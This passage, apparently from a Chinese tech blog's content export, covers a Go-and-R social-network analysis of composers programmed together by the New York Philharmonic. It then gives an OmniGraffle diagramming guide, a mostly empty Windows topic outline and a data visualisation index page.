[</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="string">&quot;soloistName&quot;</span>: <span class="string">&quot;Otto, Antoinette&quot;</span>,</span><br><span class="line">              <span class="string">&quot;soloistInstrument&quot;</span>: <span class="string">&quot;Soprano&quot;</span>,</span><br><span class="line">              <span class="string">&quot;soloistRoles&quot;</span>: <span class="string">&quot;S&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">/* more soloists, if applicable. If no soloists, this will be an empty array */</span></span><br><span class="line">          ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">/* a program will usually have multiple works */</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;ID&quot;</span>: <span class="string">&quot;0*&quot;</span>,</span><br><span class="line">          <span class="string">&quot;interval&quot;</span>: <span class="string">&quot;Intermission&quot;</span>,</span><br><span class="line">          <span class="string">&quot;soloists&quot;</span>: []</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">/* Intermissions will also appear in the works array */</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">/* more programs */</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="定义指标"><a href="#定义指标" class="headerlink" title="定义指标"></a>定义指标</h4><ul>
<li>定义新指标：Coperformance</li>
</ul>
<p>鉴于演出历史库包含丰富的数据，我们最直接简单的想法是探索作曲家之间的联系 —— 作曲家在同一个演出中出现的频率是多少？我们使用这个指标是因为音乐总监经常根据主题将不同曲目放在一起，比如浪漫英雄主义（Romantic heroism），例如芝加哥交响乐团在安娜堡（Ann Arbor，密歇根州）演出曲目，包括贝多芬第五交响曲和马勒第一交响曲。</p>
<p>连接两个作曲家的原因多种多样。可能是缘于他们都创作类似的音乐——使用相同的形式和技巧、以不同的方式，或者由一个有趣的传记联系在一起。无论是什么，我们都期望它会导致两个作曲家比其他人更频繁地编排在一起。我们可以基于纽约爱乐乐团的数据库探索这些联系，因为数据的特殊性和令人难以置信的时间跨度，甚至可以追溯到爱乐乐团历史上的第一季。</p>
<p>为此，首先定义一个名为“Coperformance”指标。 Coperformance 值为：两位作曲家在同一节目中出现的次数和随机出现次数的比率。如果它的值大于 1，可以说两位作曲家以某种非常规的方式联系在一起。如果它的值小于或等于1，那么可以说这两位作曲家直接没有联系。</p>
<p>例子。假设每 100 场节目中就有 1 场同时出现两位作曲家。为了简化数学运算，数据库中有一百万场演出。如果作曲家只是随机出现，我们假设所有节目中有第一位作曲家出现的概率为 1％ ，第二位作曲家出现的概率也为 1％，即所有节目中两位作曲家同时出现的概率为 0.01％（本例中为100场）。事实上，如果两位作曲家一起出现在 200 个程序中，那么 Coperformance 值就是2，数据显示他们之间的联系非常紧密。如果他们只出现在 90 个节目中，那么从数据上看，没有证据表明两位作曲家之间有任何联系，除了他们都是古典音乐作曲家而已。</p>
<p>需要说明的是，Coperformance 指标只能衡量作曲家之间的链接数量，并不知道驱动链接的原因。如前所述，可能有各种各样的事物将作曲家联系起来并提高 Coperformance 值，从音乐风格到传记信息，“也许音乐总监喜欢两位作曲家的美学”。要弄清楚具体是什么驱动链接，需要另外检查它们出现在相同演出的原因，看看是否存在共同主题。</p>
<h4 id="指标可视化"><a href="#指标可视化" class="headerlink" title="指标可视化"></a>指标可视化</h4><p>Coperformance 指标可视化可以基于社交网络（Social networks）实现。</p>
<p>交友软件一般都是典型的社交网络，例如 Facebook/QQ/微信。社交网络主要由两部分组成：节点(nodes)和边(edges)。节点是网络中的个人，边是连接两个节点的线，就像两个 Facebook 好友一样。在我们的例子中，边是二元的和非定向的（两个人要么是、要么不是朋友；如果你不是我的朋友，我不能成为你的朋友）。实际上，边可以有不同的权重，也可以是定向的。</p>
<p>在作曲家网络中，每个节点都是一个单独的作曲家，边是加权的，并通过 Coperformance 值表示具有相同链接的作曲家。如果一对作曲家的 Coperformance 值大于 1，他们之间就具有强化联系，如果 Coperformance 值小于或等于 1 就不会。我们可以通过调整边的权重，使得变的线条更大、颜色更深（通过Coperformance 表现强化链接）进一步可视化网络。也可以对节点做类似的事情，使作曲家的节点根据他们在演出历史中出现的次数而变得越来越大或越来越小。</p>
<p>最后，可视化工具为了使网络更加漂亮，可以将作曲家分组为集群（clusters）或社区（communities）。如果几个作曲家交织在一起，那么他们彼此都会有很高的 Coperformance 值。这有点类似于 Facebook 上的社交圈（social clique）。集群可视化的实现方式简单说就是根据它们所属的社区对节点进行着色。对此，有两点需要特别说明：</p>
<p>首先，关于聚类算法的工作原理超出了本文的范围，可以参考 <a href="https://en.wikipedia.org/wiki/Social_network_analysis">Wikipedia page on social network analysis</a> 。</p>
<p>其次，就像 Coperformance 值无法解释将作曲家链接在一起的原因一样，聚类算法也无法解释到底是什么原因导致聚集发生。这是属于音乐导演和音乐学家需要回答的问题，而不属于数学领域。</p>
<p>总而言之，作曲家网络的节点代表单个作曲家，并且具有两个属性：大小表示他们上演的频率和颜色表示他们在网络中所属的集群。网络中的边表示作曲家之间的链接情况，随着连接变得越来越强边也就变得越来越大、颜色越来越深。</p>
<h4 id="可视化编程"><a href="#可视化编程" class="headerlink" title="可视化编程"></a>可视化编程</h4><p>构建作曲家网络的过程可以分为三个主要步骤：从格式化文件中读取数据，迭代数据中的所有成对出现的作曲家以计算其 Coperformance 值，网络可视化。</p>
<p>Go 语言在前两个步骤中表现非常棒，但它没有任何网络可视化软件包可以在易用性和功能性方面媲美 R igraph 和 R visNetwork 。此外，相比于类似的 Go 软件包，Rstudio shiny 在构建用户界面和下载数据方面更具优势。自然地，该项目使用 sexp 包（注：原作者编写的开源代码库）。上述所有元素组合在一起部署在服务器上，就可以实现作曲家网络及可视化应用。</p>
<p>使用说明。用户指定数据范围（开始和结束时间）以及网络中需要包含的作曲家的Coperformance 指标最小值。</p>
<p>首先，程序将这些数据文件的名称从 R（和 shiny 包）传递给 Go （使用 sexp 包）。然后，Go 读取文件，根据用户的规范解析数据，计算网络中所有作曲家成对出现的 Coperformance 值，并将结果写入用户可以下载的 JSON 和 csv 数据文件。接下来从 Go 获取数据文件名（通过 sexp 传递），计算网络中的集群，并将其可视化。</p>
<p>在这个项目中，虽然在没有 sexp 软件包的情况下几乎不会像现在这样干净，但它确实暴露了 sexp 软件包的弱点。通过文件连接 R 语言和 Go 语言太麻烦了，因为 sexp 不支持在 R 语言和 Go 语言之间传递矩阵（matrix）或字符串向量 (vector)。使 sexp 软件包更加灵活、缩小这一差距，将是我接下来的首要工作。</p>
<p>如果利用统计数据还可以改进作曲家网络。从统计学上讲，两位作曲家随机出现的出场次数不是一个特定的数字（如上例中的 100），而是基于概率的一系列数字。</p>
<p>如果将实际观测到的次数与我们认为合适的显着性水平（可能为95％）的上限进行比较，则可能更准确。例如，在上面的案例中将是 101 而不是 100 。(编者注：由于假设检验是根据样本提供的信息进行推断的，也就有犯错误的可能。例如，原假设正确，而我们却把它当成错误的加以拒绝。犯这种错误的概率用 α 表示，统计上把 α 称为假设检验中的显著性水平，也就是决策中所面临的风险。它是公认的小概率事件的概率值，必须在每一次统计检验之前确定，通常取α＝0.05 或 α＝0.01 。这表明，当作出接受原假设的决定时，其正确的可能性/概率为 95％ 或 99％）</p>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h4 id="New-York-Philharmonic"><a href="#New-York-Philharmonic" class="headerlink" title="New York Philharmonic"></a>New York Philharmonic</h4><p>纽约爱乐（New York Philharmonic），正式全名为纽约爱乐交响乐协会（Philharmonic-Symphony Society of New York, Inc.），世界上历史最悠久的乐队之一， 1842 年在美国纽约市成立。纽约爱乐是美国成立时间最长的乐团，属于美国五大管弦乐团之一。纽约爱乐完成过多个音乐作品的美国首演，例如贝多芬的《第九交响曲》。纽约爱乐目前一年大约演出 180 场音乐会。</p>
<blockquote>
<p>芝加哥交响乐团（穆蒂的新东家）的特点是有力量，以机床般强劲的铜管乐器为核心，这主要是由指挥弗里茨·莱纳(Fritz Reiner)带动起来的，后被格奥尔格·佐尔蒂(Georg Solti)进行了略带夸张的演绎；波士顿交响乐团的特点是稍微有点狂热，具有穿透力，很适合它演奏的法国音乐，指挥是查尔斯·明希(Charles Munch)和皮埃尔·蒙度(Pierre Monteux)；伦纳德·伯恩斯坦(Leonard Bernstein)领导下的纽约爱乐乐团的特点是态度轻松、随意。—— 《纽约时报》</p>
</blockquote>
<ul>
<li>官方网站（可检索自）：<a href="https://archives.nyphil.org">https://archives.nyphil.org</a></li>
<li><a href="https://overthinkdciapps.com/coperformance/">New York Philharmonic Coperformance Project</a></li>
</ul>
<h4 id="Chicago-Youth-Symphony-Orchestra"><a href="#Chicago-Youth-Symphony-Orchestra" class="headerlink" title="Chicago Youth Symphony Orchestra"></a>Chicago Youth Symphony Orchestra</h4><ul>
<li><a href="https://github.com/GPSBach/CYSOadvancements">Chicago Youth Symphony Orchestra college advancement statistics for diversity initiative</a></li>
</ul>
<p>These statistics are of great concern to those within the classical music world, and especially amongst orchestras in Chicago, which is one of America’s most diverse cities.  To this end, several of the city’s leading classical music teaching institutions have formed a partnership to understand and enhance their roles in cultivating diverse professional musicians of tomorrow.  This group, the Chicago Musical Pathways Initiative, was built to identify talented, motivated students early in their training, provide them with the resources they need to help them achieve their full musical potential, and ultimately to increase diversity in America’s professional, musical landscape.</p>
<p><img src="https://extraordinaryleastsquares.files.wordpress.com/2018/11/presentation1.png?w=1000&amp;h=562" alt=""></p>
<h2 id="资源链接"><a href="#资源链接" class="headerlink" title="资源链接"></a>资源链接</h2><ul>
<li><a href="https://overthinkdciapps.com/coperformance/">Project Coperformance Site</a></li>
<li><a href="https://github.com/EMurray16/coperformance">Project Code:New York Philharmonic and Social Network Analysis</a></li>
<li><a href="https://github.com/nyphilarchive/PerformanceHistory">New York Philharmonic Performance History repository</a></li>
<li><a href="https://en.wikipedia.org/wiki/Social_network_analysis">Wikipedia page on social network analysis</a></li>
<li><a href="http://shiny.rstudio.com/">R Shiny</a><br>Shiny is an R package that makes it easy to build interactive web apps straight from R. You can host standalone apps on a webpage or embed them in R Markdown documents or build dashboards. You can also extend your Shiny apps with CSS themes, htmlwidgets, and JavaScript actions.</li>
<li><a href="https://datastorm-open.github.io/visNetwork/">R visNetwork</a><br>visNetwork is an R package for network visualization, using vis.js javascript library (<a href="http://visjs.org/">http://visjs.org/</a>)</li>
<li><a href="https://igraph.org/">Project igraph</a><br>igraph is a collection of network analysis tools with the emphasis on efficiency, portability and ease of use. igraph is open source and free. igraph can be programmed in R, Python, Mathematica and C/C++.</li>
<li><a href="https://github.com/EMurray16/Rgo/tree/master/sexp">Project sexp (Rgo)</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="音乐史"><a href="#音乐史" class="headerlink" title="音乐史"></a>音乐史</h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/Artistic-Classical/">古典音乐低俗史</a></li>
</ul>
<h4 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h4><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-BestAppMap">数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测</a></li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.com/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.com/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.com/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://zh.wikipedia.org/wiki/%E7%BA%BD%E7%BA%A6%E7%88%B1%E4%B9%90">纽约爱乐</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E8%8A%9D%E5%8A%A0%E5%93%A5%E4%BA%A4%E5%93%8D%E4%B9%90%E5%9B%A2">芝加哥交响乐团</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>数据可视化</tag>
        <tag>Artistic</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>数据可视化（一）思维利器 OmniGraffle for Mac 使用指南</title>
    <url>/2017/09/15/Visualization-OmniGraffle/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>OmniGraffle 是由 The Omni Group 制作的一款绘图软件，它曾获得苹果设计奖。OmniGraffle 可以支持流程图、逻辑图或者网页产品模型设计等，功能非常强大。与 Graffle 对应的是在Windows平台广泛应用的 MS Visio（ Graffle 这个词据说就是为了和Visio区分而硬造出来的），关于这两个产品的用户体验对比，本文会稍有涉及。</p>
<p>关于它的使用细节——术的方面，建议读者直接参考帮助文档或平台上其他作者的教程。本文 <strong>重点</strong> 想探讨的，是在工程实践中的一些方法论——跟“道”有关的一些个人体会。</p>
<p><a href="http://www.jianshu.com/p/ccc8d64c7202">首发版本：《最佳工程时间——思维利器 OmniGraffle》| 简书-201601 </a>，本文有更新修正。</p>
<span id="more"></span>
<h2 id="一、思维可视化"><a href="#一、思维可视化" class="headerlink" title="一、思维可视化"></a>一、思维可视化</h2><p>一般人的大部分思考过程都是杂乱无序的，没有逻辑的，最后也没法形成有效的沉淀，更无法找到清晰的结论。不是所有的人都是天生就有很好的逻辑的，但是逻辑是可以训练的，只要你懂的把自己的思维进行可视化的展示、分析和整理。</p>
<ul>
<li>常见的思维可视化模型</li>
</ul>
<ol>
<li>放射状规整（思维导图、鱼骨图）－－以后专门讨论（例如 MindManager 等）</li>
<li>层次化规则（架构图、组织结构图）</li>
<li>线性化规整（路径图、时间线）</li>
<li>矩阵式规则（SWOT 分析、商业模式画布）</li>
</ol>
<h2 id="二、数据流"><a href="#二、数据流" class="headerlink" title="二、数据流"></a>二、数据流</h2><p>概要数据流可以快速梳理出数据流向，顺手还能体现数据模型的结构关系。<br><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_5.png" alt="数据流示例"></p>
<h2 id="三、业务流"><a href="#三、业务流" class="headerlink" title="三、业务流"></a>三、业务流</h2><h4 id="第一步：确定边界"><a href="#第一步：确定边界" class="headerlink" title="第一步：确定边界"></a>第一步：确定边界</h4><p>开始可能不太明了，或者中途有新的变更，但是不要紧，只要搞清楚起点和终点，确定边界&amp;关键里程碑，解决从哪里来、到哪里去的终极问题，就能纲举目张画出全局流程图，之后再集中精力各个击破。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_4.png" alt="概要总图"></p>
<h4 id="第二步：针对不同子流程各个击破"><a href="#第二步：针对不同子流程各个击破" class="headerlink" title="第二步：针对不同子流程各个击破"></a>第二步：针对不同子流程各个击破</h4><p><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_12.png" alt="子流程1"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_14.png" alt="子流程2"></p>
<h4 id="第三步：不仅仅是几个框"><a href="#第三步：不仅仅是几个框" class="headerlink" title="第三步：不仅仅是几个框"></a>第三步：不仅仅是几个框</h4><p>完成第二步之后，传统语境下的流程图就完成了。但是，作为一个有追求的演员，似乎还可以尝试点什么。突然，一道灵光撞击出来新的想法。事不宜迟，马上记下来。拖几个元素，插入表格、贴上截图，简单的概要原型页就出来了。神来之笔：借用IOS风格的搜索栏，网页原型是不是颇有大写意风格。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_7.png" alt="概要原型图"></p>
<h4 id="第四步：文档归集"><a href="#第四步：文档归集" class="headerlink" title="第四步：文档归集"></a>第四步：文档归集</h4><p>在工程实践中，项目或产品文档的管理从来都是一个难题。从初识阶段开始，产品、设计、开发、测试、运营团队在组织架构上可能是分离的，大家本能地按自己的风格习惯写文档，即使是最重要的几个文档，也常常是Visio、PowerDesign、Word、PPT等各种格式混杂，每种文档可能还有软件版本的兼容性差异。再加上积年累月的人员更迭、团队重组，各种混乱交接，有时查一个简单的问题，都可能要打开电脑上所有的办公软件、十几个窗口。这是要疯掉的节奏，非常非常低效！基于OmniGraffle良好的兼容特性，完全可以将关键文档整合到一个Graffle文件，不但可以为当前进行的工作中保持迭代、保护成果，还能持续收拢、归纳、索引关键信息，为后续的改进优化打下好的基础。</p>
<ul>
<li>文档树</li>
<li>开局索引</li>
<li>添加动作</li>
<li>跳转动作特性：切换版面、显示／隐藏图层、运行脚本</li>
<li>多类型分发：支持导出Pdf/PNG/HTML/Graffle模版等</li>
<li>导出文件动作保真：Pdf文件支持亦支持动作跳转</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_6.png" alt="开局索引"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_8.png" alt="文档树"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_9.png" alt="跳转动作特性"></p>
<h2 id="四、技巧"><a href="#四、技巧" class="headerlink" title="四、技巧"></a>四、技巧</h2><h4 id="1、构建组件库"><a href="#1、构建组件库" class="headerlink" title="1、构建组件库"></a>1、构建组件库</h4><p>Graffle和Visio一样，提供了扩展资源库的支持，想要什么组件，搜一搜就有了。然而很多时候，我们面临问题不是缺少资源，而是资源太多，无法快速作出选择。正如制造工厂里的模具，码农的代码库，有逼格的人一定受不了拖个按钮都得搜索、调色半天。Graffle自带的资源、以前设计的组件、搜罗来的图片/PPT/Visio资源，日常工作中新发明的兵器，最好分门别类放到一个专门的版面。从最原始各种大小字体、点、线条、箭头开始，逐渐积累起组件，甚至样板页，不断吸收、调整、优化，愈积愈厚，直至形成自己的风格，是不是有点像逍遥派的北冥神功？当然，不排除牛人们是从一开始就可以开发出好几套不同Style的套装。</p>
<ul>
<li>检索扩展资源库</li>
<li>Build Style Library</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_11.png" alt="检索扩展资源库"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_1.png" alt="Style Library"></p>
<h4 id="2、技术资产保护"><a href="#2、技术资产保护" class="headerlink" title="2、技术资产保护"></a>2、技术资产保护</h4><p>对于众多的用户来说，最大限度的复用现有数据成果，对于技术资产保护具有重要意义。包括但不限于不同工具的成果复用和转换，以及能够将存量数据迁移到 OminGraffle 非常重要。原来是 Windows 平台的用户有一个非常友好的特性，即可以在 OmniGraffle 直接打开MS Visio文件,并在此基础上继续编辑。</p>
<ul>
<li>从MS Visio迁移</li>
<li>从Axure迁移</li>
<li>其它迁移：截图 &amp; 外部图片</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_2.png" alt="从MS Visio迁移"><br><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_13.png" alt="从Axure迁移"></p>
<h4 id="3、踩过的坑"><a href="#3、踩过的坑" class="headerlink" title="3、踩过的坑"></a>3、踩过的坑</h4><ul>
<li>自动布局非常坑爹</li>
<li>自动布局的适用场景</li>
</ul>
<p>OmniGraffle新建文件的初始设置默认是自动布局的。每当你增加一个元素，调整一下位置，command+S , 我去！！刚才的努力白费了，它会按照一套匪夷所思的对齐规则重新布局！ 除了非常简单的图形，是在想不出实际工作中有什么东西是按照经典原型排列的。好吧，我承认，因为这个坑爹的原因。我大概几个月的时间不知道怎么用这玩意，差点放弃！！虽然开始在自动布局上踩了坑，但是这招在某些情况下还是非常有用的，例如下面这个，不是美术系的怎么可能画这么圆?  还是那句话，特性很多，都有适用范围，合适就好。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_3.png" alt="自动布局-操作按钮"></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/OmniGraffle_Action_201601_10.png" alt="自动布局-环形效果图"></p>
<h2 id="拓展阅读：工作效率软件"><a href="#拓展阅读：工作效率软件" class="headerlink" title="拓展阅读：工作效率软件"></a>拓展阅读：工作效率软件</h2><ul>
<li><a href="http://www.jianshu.com/p/7c453ce42150">最佳写作实践：从Evernote到Ulysses</a></li>
<li><a href="https://riboseyim.com/2017/06/03/Writing-WriterToolChain/">高效创作：我的写作工具链</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">大道至简：我的项目管理工具集</a></li>
</ul>
<h2 id="扩展阅读：数据可视化"><a href="#扩展阅读：数据可视化" class="headerlink" title="扩展阅读：数据可视化"></a>扩展阅读：数据可视化</h2><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-BestAppMap">数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测</a></li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.com/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.com/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
<li><a href="https://riboseyim.com/2018/12/16/Visualization-SocialNetwork/">数据可视化（八）Program,Data and Classical Music</a></li>
<li><a href="https://riboseyim.com/2018/01/15/Visualization-DataSource/">数据可视化（十）公共数据源列表</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://devstreaming-cdn.apple.com/videos/wwdc/2019/710aunvynji5emrl/710/710_whats_new_in_apple_file_systems.pdf">精品幻灯片 | What’s New in Apple Filesystems</a></li>
<li><a href="https://mp.weixin.qq.com/s/MNXeu7d1P4dYBZVr1Zhy5A">如何画好架构图</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>数据可视化</tag>
        <tag>Mac</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 操作系统专题</title>
    <url>/2019/02/06/Windows/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>The History</li>
<li>Overview of the Mac</li>
<li>Application and Development</li>
<li>Future</li>
</ul>
<a id="more"></a>
<h1 id="The-Big-Picture"><a href="#The-Big-Picture" class="headerlink" title="The Big Picture"></a>The Big Picture</h1><h3 id="The-History"><a href="#The-History" class="headerlink" title="The History"></a>The History</h3><h1 id="Overview-of-the-Mac"><a href="#Overview-of-the-Mac" class="headerlink" title="Overview of the Mac"></a>Overview of the Mac</h1><h2 id="System-Resource-Utilization"><a href="#System-Resource-Utilization" class="headerlink" title="System Resource Utilization"></a>System Resource Utilization</h2><h3 id="Introduction-to-Resource-Monitoring"><a href="#Introduction-to-Resource-Monitoring" class="headerlink" title="Introduction to Resource Monitoring"></a>Introduction to Resource Monitoring</h3><h3 id="Load-Averages"><a href="#Load-Averages" class="headerlink" title="Load Averages"></a>Load Averages</h3><h3 id="Measuring-Memory"><a href="#Measuring-Memory" class="headerlink" title="Measuring Memory"></a>Measuring Memory</h3><h3 id="Measuring-CPU"><a href="#Measuring-CPU" class="headerlink" title="Measuring CPU"></a>Measuring CPU</h3><h3 id="Measuring-I-O"><a href="#Measuring-I-O" class="headerlink" title="Measuring I/O"></a>Measuring I/O</h3><ul>
<li>磁盘分析工具 SpaceSniffer.exe</li>
</ul>
<h3 id="Per-Processes-Monitoring"><a href="#Per-Processes-Monitoring" class="headerlink" title="Per-Processes Monitoring"></a>Per-Processes Monitoring</h3><h1 id="Application-and-Development"><a href="#Application-and-Development" class="headerlink" title="Application and Development"></a>Application and Development</h1><h1 id="Future"><a href="#Future" class="headerlink" title="Future"></a>Future</h1><h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h1><h4 id="Upgrade-win10-from-win7"><a href="#Upgrade-win10-from-win7" class="headerlink" title="Upgrade win10 from win7"></a>Upgrade win10 from win7</h4><ul>
<li>要求：C 盘剩余空间：8GB</li>
</ul>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul>
<li><a href="https://live.sysinternals.com/" target="_blank" rel="noopener">Windows sysinternals</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>OperatingSystem</tag>
      </tags>
  </entry>
  <entry>
    <title>数据可视化 | Overview of Data Visualization</title>
    <url>/2017/07/06/Visualization/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>工程绘图：OmniGraffle 绘图指南</li>
<li>自动分析：基于 Graphviz 实现程序化绘图</li>
<li>数字地图：开源 GIS 技术简史</li>
<li>开源情报：基于网络爬虫制作可视化图表</li>
<li>时序数据：常见的数据可视化仪表盘</li>
<li>概率统计：基于 Go + R 可视化古典音乐作曲家社交网络</li>
<li>在线演示案例</li>
</ul>
<span id="more"></span>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a class="main-nav-link" href="https://riboseyim.com/charts/index.html" ><img src="http://riboseyim-qiniu.riboseyim.com/icon-%E5%9B%BE%E8%A1%A8-%E6%9F%B1%E7%8A%B6%E5%9B%BE.svg" width="64px" height="64px" /><p>图表</p></a></td>
<td><a class="main-nav-link" href="https://riboseyim.com/2017/07/06/Visualization" ><img src="http://riboseyim-qiniu.riboseyim.com/icon-%E6%B5%8B%E8%AF%95%E7%94%B3%E8%AF%B7.svg" width="64px" height="64px" /><p>数据可视化</p></a></td>
<td><a class="main-nav-link" href="https://riboseyim.com/charts/caipiao/index.html"><img src="http://riboseyim-qiniu.riboseyim.com/icon-%E4%BF%A1%E5%8F%B7.svg" width="64px" height="64px" /><p>投机指标</p></a></td>
<td><a class="main-nav-link" href="https://riboseyim.com/charts/casad/index.html"><img src="http://riboseyim-qiniu.riboseyim.com/icon-%E5%AE%98%E6%96%B9%E7%89%88%E6%9C%AC.svg" width="64px" height="64px" /><p>科学指标</p></a></td>
<td><a class="main-nav-link" href="https://riboseyim.com/charts/pht/index.html" ><img src="http://riboseyim-qiniu.riboseyim.com/icon-%E8%87%AA%E8%A1%8C%E8%BD%A6.svg" width="64px" height="64px" /><p>运动指标</p></a></td>
<td><a class="main-nav-link" href="https://riboseyim.com/charts/usa-traffic/index.html"><img src="http://riboseyim-qiniu.riboseyim.com/icon-%E6%B5%81%E8%AE%A1%E7%AE%97.svg" width="64px" height="64px" /><p>旅行指标</p></a></td>
<td><a class="main-nav-link" href="https://riboseyim.com/charts/ip/index.html"><img src="http://riboseyim-qiniu.riboseyim.com/icon-%E4%BA%BA%E4%BD%93%E6%A3%80%E6%B5%8B.svg" width="64px" height="64px" /><p>创造指标</p></a></td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>案例：最近十年全国彩票销售变化情况 <a href="https://riboseyim.com/charts/caipiao/index.html">在线演示</a></li>
<li>案例：中国科学院院士分布（出生地与籍贯）<a href="https://riboseyim.com/charts/casad/index.html">在线演示</a></li>
<li>案例：美国航空入境旅客（出发地）变化情况 <a href="https://riboseyim.com/charts/usa-traffic/index.html">在线演示</a></li>
<li>案例：世界主要国家专利申请变化情况（欧洲专利局） <a href="https://riboseyim.com/charts/ip/index.html">在线演示</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/usa-traffic-2015.png" alt=""></p>
<h2 id="专题"><a href="#专题" class="headerlink" title="专题"></a>专题</h2><ul>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-OmniGraffle/">数据可视化（一）思维利器 OmniGraffle 绘图指南 </a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-BestAppMap">数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测</a></li>
<li><a href="https://riboseyim.com/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-GIS/">数据可视化（四）开源地理信息技术简史（Geographic Information System</a></li>
<li><a href="https://riboseyim.com/2017/05/12/Visualization-Charts/">数据可视化（五）基于网络爬虫制作可视化图表</a></li>
<li><a href="https://riboseyim.com/2017/11/23/Visualization-DashBoard/">数据可视化（六）常见的数据可视化仪表盘(DashBoard)</a></li>
<li><a href="https://riboseyim.com/2017/12/04/Visualization-Graphite/">数据可视化（七）Graphite 体系结构详解</a></li>
